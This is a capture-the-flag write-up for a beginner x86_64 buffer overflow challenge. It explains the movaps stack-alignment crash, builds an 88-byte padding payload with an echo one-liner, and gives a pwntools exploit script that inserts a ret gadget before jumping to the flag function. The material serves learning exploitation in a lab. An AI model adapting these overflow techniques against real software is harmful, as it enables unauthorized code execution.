# Simple-Bof

This challenges using ROP basic concept, What's interesting about this challenge is segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, this cuz then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

# checksec

<img width="554" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/5278dcfc-2a18-4d1e-a3b3-4703885690b1">

# Problem

<img width="423" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/06ca2040-6af8-4e09-9d9b-886bd21b89e0">

from source code, you should think, oh this chall is easy, you just overwrite return address to flag address, oke let's try

first search padding

<img width="474" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/dc506885-a432-4e86-ac1d-67badae954e1">

<br>

<img width="644" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/13e2a2a2-1a08-4d73-bbf4-2db52fb55394">

the padding is 88, if you not understarnd how to calculate, back to ret2win chall
let's create simple script with 88 padding + address flag
address flag :
<img width="165" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/ad338c38-145f-487a-9c65-ac5f6acd65d6">


script :
```
echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x87\x11\x40\x00\x00\x00\x00\x00" > payload
```
then run in the gdb using this payload and continue instruction

<img width="229" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/edcc7d92-b317-4c2e-bc9d-3e6f1728af03">

<img width="736" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/4050d2ea-c249-486e-a8c3-68e5ee806fd7">

you will found sisgev in movaps intruction, this chall break in do_system, so the solution, add gadget ret before flag address

# Final Exploit
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
#padding = 24


payload = flat(
    b'A' * 88,
    p64(0x0000000000401016),
    elf.functions.flag # 0x401142
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendline(payload)


# Receive the flag
io.interactive()

```
make flag.txt in your local, echo"your flag" > flag.txt

run

<img width="795" alt="image" src="https://github.com/Langhere/WriteUpCTFlocal/assets/142018203/2f964628-c928-4dab-a4f9-dbf733c0e482">

has pwned
